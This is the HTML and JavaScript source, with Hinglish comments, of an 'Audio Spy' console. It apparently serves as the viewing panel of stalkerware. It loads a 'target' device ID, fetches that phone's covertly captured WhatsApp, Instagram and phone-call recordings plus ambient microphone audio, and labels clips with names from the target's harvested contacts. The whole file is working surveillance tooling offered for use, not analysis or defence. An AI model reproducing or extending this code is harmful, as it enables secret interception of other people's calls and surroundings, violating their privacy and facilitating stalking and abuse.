<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Audio Surveillance Console</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    
    <script src="/socket.io/socket.io.js"></script>

    <style>
        /* ... (CSS same as before, no changes needed) ... */
        :root {
            --bg-dark: #050509;
            --card-bg: rgba(22, 27, 34, 0.8);
            --border: rgba(255, 255, 255, 0.1);
            --accent-red: #ff3b30;
            --accent-blue: #0a84ff;
            --accent-green: #30d158;
            --text-main: #ffffff;
            --text-muted: #8b949e;
            --glass: blur(12px);
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-dark);
            background-image: radial-gradient(circle at top, #161b22 0%, #000 100%);
            color: var(--text-main);
            margin: 0; padding: 0; min-height: 100vh;
        }

        .header {
            position: sticky; top: 0; z-index: 100;
            background: rgba(5, 5, 9, 0.9); backdrop-filter: var(--glass);
            border-bottom: 1px solid var(--border);
            padding: 15px 20px; display: flex; flex-direction: column; gap: 15px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }

        .top-bar { display: flex; justify-content: space-between; align-items: center; }

        .title { font-size: 1.2rem; font-weight: 600; letter-spacing: 0.5px; display: flex; align-items: center; gap: 10px; }

        .live-badge {
            font-size: 0.7rem; background: rgba(255, 59, 48, 0.15); color: var(--accent-red);
            padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(255, 59, 48, 0.3);
            display: flex; align-items: center; gap: 6px;
        }

        .dot {
            width: 6px; height: 6px; background: var(--accent-red); border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.7); }
            70% { box-shadow: 0 0 0 6px rgba(255, 59, 48, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); }
        }

        .device-info-bar {
            background: rgba(10, 132, 255, 0.1); border: 1px solid rgba(10, 132, 255, 0.3);
            padding: 10px 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center;
        }

        .device-id-display {
            font-family: monospace; color: var(--accent-blue); font-size: 1rem; font-weight: 600;
        }

        .logout-btn {
            background: transparent; border: 1px solid var(--border); color: var(--text-muted);
            padding: 5px 10px; border-radius: 5px; font-size: 0.75rem; cursor: pointer;
        }
        .logout-btn:hover { background: rgba(255,255,255,0.1); color: white; }

        .filters {
            display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none;
        }

        .filter-pill {
            background: rgba(255,255,255,0.05); border: 1px solid var(--border);
            padding: 8px 16px; border-radius: 20px; font-size: 0.85rem; color: var(--text-muted);
            cursor: pointer; white-space: nowrap; transition: 0.3s;
        }

        .filter-pill.active {
            background: var(--text-main); color: #000; font-weight: 600; border-color: var(--text-main);
        }

        .container { max-width: 800px; margin: 20px auto; padding: 0 15px; padding-bottom: 80px; }

        .card {
            background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px;
            padding: 15px; margin-bottom: 15px; display: flex; flex-direction: column; gap: 12px;
            animation: slideUp 0.4s ease;
        }

        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .card-top { display: flex; justify-content: space-between; align-items: center; }
        .file-info { display: flex; align-items: center; gap: 12px; }

        .icon-box {
            width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem; background: rgba(255,255,255,0.05);
        }

        .whatsapp { color: #25D366; background: rgba(37, 211, 102, 0.1); }
        .instagram { color: #E1306C; background: rgba(225, 48, 108, 0.1); }
        .call { color: #0a84ff; background: rgba(10, 132, 255, 0.1); }
        .mic { color: #ff3b30; background: rgba(255, 59, 48, 0.1); }

        .details h4 { margin: 0; font-size: 0.95rem; font-weight: 500; }
        .details span { font-size: 0.75rem; color: var(--text-muted); }

        audio {
            width: 100%; height: 36px; border-radius: 20px; filter: invert(1) hue-rotate(180deg); opacity: 0.8;
        }

        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; }
        
        #accessDenied {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 999; align-items: center; justify-content: center; flex-direction: column;
        }
    </style>
</head>
<body>

    <div id="accessDenied">
        <h2 style="color: var(--accent-red);">ACCESS DENIED</h2>
        <p style="color: var(--text-muted);">No Target ID Found.</p>
        <button onclick="window.location.href='index.html'" style="padding: 10px 20px; background: var(--text-main); border: none; border-radius: 5px; cursor: pointer;">Go to Login</button>
    </div>

    <div class="header">
        <div class="top-bar">
            <div class="title">
                <i class="fa-solid fa-user-secret"></i> Audio Spy
            </div>
            <div class="live-badge">
                <div class="dot"></div> LIVE
            </div>
        </div>

        <div class="device-info-bar">
            <div style="display:flex; align-items:center; gap: 8px;">
                <i class="fa-solid fa-mobile-screen" style="color:var(--text-muted)"></i>
                <span id="displayDeviceId" class="device-id-display">Target Connected</span>
            </div>
            <button class="logout-btn" onclick="logout()">CHANGE</button>
        </div>

        <div class="filters">
            <div class="filter-pill active" onclick="filterBy('All', this)">All</div>
            <div class="filter-pill" onclick="filterBy('WhatsApp', this)">WhatsApp</div>
            <div class="filter-pill" onclick="filterBy('Instagram', this)">Instagram</div>
            <div class="filter-pill" onclick="filterBy('Call', this)">Calls</div>
            <div class="filter-pill" onclick="filterBy('Mic', this)">Env. Mic</div>
        </div>
    </div>

    <div class="container" id="recordingsList">
        <div class="status-msg">Verifying Target...</div>
    </div>

    <script>
        const socket = io();
        let allRecordings = [];
        let currentFilter = 'All';
        let currentDeviceId = '';
        let localContacts = []; // Store contacts here

        window.onload = () => {
            const savedID = localStorage.getItem('spy_device_id');

            if (!savedID) {
                document.getElementById('accessDenied').style.display = 'flex';
                return;
            }

            currentDeviceId = savedID;
            // CHANGED: Yahan ID display update karna band kar diya taki ID show na ho
            // document.getElementById('displayDeviceId').innerText = ... (Removed)

            // 1. Load Contacts from LocalStorage
            loadLocalContacts();

            // 2. Fetch Audio
            fetchHistory();
            joinSocketRoom(currentDeviceId);
        };

        // --- NEW: Contacts Loading Logic ---
        function loadLocalContacts() {
            // Contacts page wala key use kar rahe hain
            const key = `contacts_${currentDeviceId}`;
            const saved = localStorage.getItem(key);
            if (saved) {
                try {
                    localContacts = JSON.parse(saved);
                    console.log("Contacts Loaded:", localContacts.length);
                } catch (e) {
                    console.error("Error parsing contacts", e);
                }
            }
        }

        // --- NEW: Number to Name Matcher ---
        function matchNameFromNumber(filenameString) {
            // Filename me se number dhoondo (kam se kam 5 digit)
            // Example filename: "Call_9876543210_123456.mp3"
            const numberMatch = filenameString.match(/(\d{6,})/); 
            
            if (numberMatch) {
                let foundNumber = numberMatch[0];
                
                // Local contacts me search karo
                // (Thoda loose search: agar file number, contact number me exist karta hai ya vice versa)
                const contact = localContacts.find(c => {
                    if (!c.number && !c.phone) return false;
                    let cNum = (c.number || c.phone).replace(/\D/g, ''); // Sirf digits rakho
                    return cNum.includes(foundNumber) || foundNumber.includes(cNum);
                });

                if (contact && contact.name) {
                    return contact.name; // Naam mil gaya!
                }
                return foundNumber; // Naam nahi mila to Number dikhao
            }
            return null; // Number hi nahi mila file name me
        }

        socket.on('new-audio', (data) => {
            if(currentDeviceId && data.device_id !== currentDeviceId) return;

            console.log("ðŸ”Š New Audio Received:", data);

            const processed = {
                app: detectApp(data.name),
                displayName: getDisplayName(data.name), // Name logic yahan lagaya
                date: new Date().toLocaleDateString(),
                time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                url: data.url,
                id: data.device_id
            };

            allRecordings.unshift(processed);
            render();
        });

        function joinSocketRoom(id) {
            socket.emit('join', id);
        }

        async function fetchHistory() {
            document.getElementById('recordingsList').innerHTML = `<div class="status-msg">Syncing Audio Data...</div>`;

            try {
                const res = await fetch(`/api/audio-history/${currentDeviceId}`);
                const data = await res.json();

                if(Array.isArray(data) && data.length > 0) {
                    allRecordings = data.map(file => processCloudinaryFile(file));
                    render();
                } else {
                    document.getElementById('recordingsList').innerHTML = `<div class="status-msg">No recordings found yet.</div>`;
                    allRecordings = [];
                }
            } catch (e) {
                console.error(e);
                document.getElementById('recordingsList').innerHTML = `<div class="status-msg" style="color:var(--accent-red)">Connection Error!</div>`;
            }
        }

        function render() {
            const container = document.getElementById('recordingsList');
            container.innerHTML = '';

            const filtered = allRecordings.filter(rec => 
                currentFilter === 'All' ? true : rec.app === currentFilter
            );

            if(filtered.length === 0) {
                container.innerHTML = `<div class="status-msg">No audio clips found for this filter.</div>`;
                return;
            }

            filtered.forEach(rec => {
                const iconInfo = getIconInfo(rec.app);
                
                // CHANGED: Title ab 'displayName' se aayega
                const html = `
                    <div class="card">
                        <div class="card-top">
                            <div class="file-info">
                                <div class="icon-box ${iconInfo.cls}">
                                    <i class="${iconInfo.icon}"></i>
                                </div>
                                <div class="details">
                                    <h4>${rec.displayName}</h4>
                                    <span>${rec.app} â€¢ ${rec.date} â€¢ ${rec.time}</span>
                                </div>
                            </div>
                        </div>
                        <audio controls controlsList="nodownload">
                            <source src="${rec.url}" type="audio/mp4">
                            <source src="${rec.url}" type="audio/mpeg">
                            Your browser does not support audio.
                        </audio>
                    </div>
                `;
                container.innerHTML += html;
            });
        }

        function logout() {
            if(confirm("Disconnect from this target?")) {
                localStorage.removeItem('spy_device_id');
                window.location.href = 'index.html'; 
            }
        }

        function processCloudinaryFile(file) {
            const d = new Date(file.created_at);
            const fileName = file.filename || file.public_id || "";
            
            return {
                app: detectApp(fileName),
                displayName: getDisplayName(fileName), // Name logic
                date: d.toLocaleDateString(),
                time: d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                url: file.secure_url,
                id: currentDeviceId
            };
        }

        // --- Helper to decide what name to show ---
        function getDisplayName(filename) {
            const app = detectApp(filename);
            
            // Step 1: Try to find name from contact list using filename number
            const matchedName = matchNameFromNumber(filename);
            
            if (matchedName) {
                // Agar contact match ho gaya
                return matchedName; 
            }
            
            // Step 2: Agar contact match nahi hua, to generic naam do
            if (app === 'WhatsApp') return 'WhatsApp Call';
            if (app === 'Instagram') return 'Instagram Call';
            if (app === 'Mic') return 'Ambient Recording';
            
            return 'Unknown Number';
        }

        function detectApp(name) {
            if(!name) return "Call";
            name = name.toLowerCase();
            if(name.includes('whatsapp')) return 'WhatsApp';
            if(name.includes('instagram')) return 'Instagram';
            if(name.includes('telegram')) return 'Telegram';
            if(name.includes('mic')) return 'Mic';
            return 'Call';
        }

        function getIconInfo(app) {
            if(app === 'WhatsApp') return { cls: 'whatsapp', icon: 'fab fa-whatsapp' };
            if(app === 'Instagram') return { cls: 'instagram', icon: 'fab fa-instagram' };
            if(app === 'Mic') return { cls: 'mic', icon: 'fas fa-microphone-lines' };
            return { cls: 'call', icon: 'fas fa-phone-volume' };
        }

        function filterBy(filter, btnElement) {
            currentFilter = filter;
            document.querySelectorAll('.filter-pill').forEach(btn => btn.classList.remove('active'));
            btnElement.classList.add('active');
            render();
        }

    </script>
</body>
</html>
